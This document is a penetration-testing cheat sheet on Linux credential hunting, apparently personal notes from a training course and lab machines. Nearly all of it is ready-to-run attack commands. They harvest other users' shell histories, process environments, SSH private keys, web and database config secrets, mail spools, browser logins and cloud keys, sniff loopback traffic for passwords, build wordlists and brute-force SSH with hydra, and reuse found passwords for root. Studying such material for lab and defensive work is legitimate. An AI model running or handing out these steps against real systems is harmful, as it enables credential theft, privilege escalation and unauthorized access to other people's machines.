title: Linux Credential Hunting
body: Module 18.2: low hanging fruit first. Bash history, env vars, config files, service footprints. watch -n 1 on ps for cleartext creds in process args. HIGHEST YIELD when you have a service-user shell: grep that service's own data dir (/var/lib/<app>, /opt/<app>) — plaintext creds there are routinely reused for root.
cmd:
# ── BASH HISTORY ─────────────────────────────────────
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
history
# Look for: ssh commands, mysql -p, passwords in commands

# ── ENVIRONMENT VARIABLES ─────────────────────────────
env
cat ~/.bashrc
cat ~/.bash_profile
cat /etc/environment
env | grep -i "pass|key|secret|token|api|db|cred"
# Module 18.2.1 example: SCRIPT_CREDENTIALS=lab in .bashrc
# Try it directly: su - root (use found password)

# ── WATCH PROCESSES FOR CLEARTEXT CREDS ─────────────
# Module 18.2.2 — processes often leak creds in args
watch -n 1 "ps aux | grep pass"
watch -n 1 "ps aux | grep -i 'pass|cred|secret|key'"

# ── TCPDUMP — SNIFF LOOPBACK FOR CREDS ───────────────
# Requires sudo tcpdump permission
sudo tcpdump -i lo -A | grep -i "pass|user|login"
sudo tcpdump -i any -A -s 0 | grep -i "pass|authorization"

# ── CONFIG FILES ──────────────────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -il "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat
find / -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null | head -20
find / -name "database.yml" -o -name "settings.py" -o -name ".env" 2>/dev/null | xargs cat 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# ── SSH KEYS ──────────────────────────────────────────
find / -name "id_rsa" 2>/dev/null
find / -name "id_rsa.pub" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
ls -la ~/.ssh/

# ── /PROC ENVIRON — OTHER USERS ENV VARS ─────────────
cat /proc/*/environ 2>/dev/null | tr '�' '
' | grep -i "pass|key|secret"

# ── RECENTLY MODIFIED FILES ───────────────────────────
find / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys
find / -mtime -1 -type f 2>/dev/null | grep -v proc

# ── INTERESTING FILES ─────────────────────────────────
find / -name "*.txt" -path "*/home/*" 2>/dev/null
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null   # KeePass
ls -la /var/backups/ 2>/dev/null

# ── WRITABLE /ETC/PASSWD ──────────────────────────────
ls -la /etc/passwd
# If -rw-rw-rw- = instant root via /etc/passwd abuse (see linux_manual_enum)

# ── CRUNCH + HYDRA — MUTATE FOUND PASSWORD ────────────
# Module 18.2.1: if you find a password like "Lab" — generate variants
# Pattern: known prefix + 3 digits
crunch 6 6 -t Lab%%% > /tmp/wordlist
# Then brute SSH:
hydra -l eve -P /tmp/wordlist $ip -t 4 ssh -V

# More patterns:
crunch 8 8 -t Pass%%%% > /tmp/wordlist2
crunch 6 8 -t @@@@%% > /tmp/wordlist3   # letters + digits

# Once cracked — sudo -l immediately
sudo -l

# ══════════════════════════════════════════════════
# ★ HIGH-YIELD: GREP THE COMPROMISED APP'S DATA DIR ★
# (this pattern won Fired, Flu, and the Squid box this session)
# ══════════════════════════════════════════════════
# When you get a shell AS a service user (openfire, confluence, tomcat,
# www-data, postgres), that service's config/data dir almost always holds
# plaintext creds — and they're frequently REUSED for root.
#
# Grep the app's home/data dir for passwords:
grep -r -i password /var/lib/<app> 2>/dev/null
grep -r -i password /opt/<app> 2>/dev/null
grep -r -i -E 'password|passwd|secret|cpassword|connectionString' /etc/<app> 2>/dev/null
#
# Real hits from this session:
#   Openfire:   /var/lib/openfire/embedded-db/openfire.script
#               → OFPROPERTY 'mail.smtp.password' = root password
#   Confluence: /var/atlassian/.../confluence.cfg.xml + /proc/PID/environ
#               → synchrony.database.password = root password
#   Web app:    C:/wamp/www/.../web.config → sa password (reused)
#
# Then try EVERY value found as root:
su root                    # from the service-user shell
ssh root@$ip               # if root SSH is allowed
# And try them for other local users (cat /etc/passwd for names).
#
# RULE: service-user shell → grep its data dir → reuse for root.
# Do this BEFORE kernel/SUID exploits. It's the intended path more often
# than not, and it's faster and more reliable than PwnKit.

# Also check running process args for creds (mysql -p, curl -u, sshpass):
ps aux | grep -iE 'pass|pwd|token|-u ' | grep -v grep
# Watch live for creds passing through process args:
# watch -n 1 'ps -eo args | grep -iE "pass|pwd"'

# ══════════════════════════════════════════════════
# MORE HIGH-YIELD HUNTING SPOTS (commonly missed)
# ══════════════════════════════════════════════════

# ── DATABASE FILES ON DISK (not just configs) ─────────
# If a DB service runs locally, read its data files directly — no login:
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
strings /path/to/app.db | grep -i -E 'pass|hash|user|admin'
# MySQL data dir (readable as root, or the mysql user):
ls -la /var/lib/mysql/ ; cat /var/lib/mysql/mysql/user.MYD 2>/dev/null | strings
# Look for user tables → hashes to crack or plaintext to reuse.

# ── MAIL SPOOLS (users get creds emailed to them) ─────
cat /var/mail/* /var/spool/mail/* 2>/dev/null
# Onboarding / password-reset mails often sit here in plaintext.

# ── CRON SCRIPTS OFTEN CONTAIN CREDS ──────────────────
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
# Any script a cron runs — read it. Backup/sync scripts embed passwords:
grep -rniE 'pass|pwd|token|mysql -u|curl -u|sshpass|wget.*--password' /etc/cron* /opt /usr/local/bin 2>/dev/null

# ── SUDO -l WITHOUT A PASSWORD (before you even find creds) ─
sudo -l 2>/dev/null
# NOPASSWD entries need no creds at all. Check FIRST — free privesc.

# ── LOG FILES (plaintext creds land here from typos/verbose) ──
grep -riE 'password=|pwd=|passwd |PASS=' /var/log 2>/dev/null | head
# Auth logs catch passwords typed at the username prompt by mistake:
grep -i 'password' /var/log/auth.log 2>/dev/null

# ── GIT REPOS — SECRETS IN HISTORY ────────────────────
find / -name ".git" -type d 2>/dev/null
# In a repo, old commits leak removed creds:
cd /path/to/repo && git log -p 2>/dev/null | grep -iE 'pass|secret|key|token'
cat .git/config   # sometimes has creds in the remote URL

# ── CONFIG-FILE CREDS: SEARCH BY EXTENSION, ALL AT ONCE ─
grep -rniE 'password|passwd|pwd|secret|api[_-]?key|token' \
  --include=*.php --include=*.py --include=*.rb --include=*.js \
  --include=*.yml --include=*.yaml --include=*.xml --include=*.ini \
  --include=*.conf --include=*.env --include=*.json \
  /var /opt /home /etc 2>/dev/null | grep -v -i 'password_label\|type=\|placeholder' | head -40
# The grep -v filters out HTML form noise (like Openfire's password_label).

# ── PASSWORD MANAGERS / VAULTS ────────────────────────
find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null   # KeePass → john/hashcat
find / -name ".password-store" -type d 2>/dev/null    # pass(1)
find / -path "*/.mozilla/*" -name "logins.json" 2>/dev/null   # Firefox saved logins
find / -path "*.aws/credentials" -o -path "*.azure/*" 2>/dev/null   # cloud keys

# ── REUSE FOUND PASSWORD EVERYWHERE (spray locally) ───
# Found ONE password? Try it for EVERY local user, not just root:
for u in $(cut -d: -f1 /etc/passwd); do echo "$u"; done   # list users
# Then: su <user>  with the found password for each interesting account.
# Password reuse across accounts is the #1 lab pattern.

choices.label: Found .git repo on the box — mine commit history
